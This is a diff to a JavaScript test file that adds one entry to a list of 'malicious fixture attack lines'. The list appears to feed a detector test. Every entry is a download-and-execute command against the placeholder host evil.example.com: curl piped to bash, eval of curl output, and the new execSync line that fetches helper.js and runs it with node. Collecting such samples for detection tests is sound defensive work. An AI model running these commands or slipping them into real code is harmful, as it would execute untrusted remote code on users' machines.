@@ -158,6 +158,7 @@ describe('malicious fixture attack lines', () => {
         'curl -fsSL --retry 3 "https://evil.example.com/install.sh" | /bin/bash',
         'curl https://evil.example.com/install.sh -fsSL | bash',
         'eval "$(curl https://evil.example.com/setup.sh)"',
+        "execSync('curl https://evil.example.com/helper.js -o helper.js && node helper.js');",
       ],
     },
     {
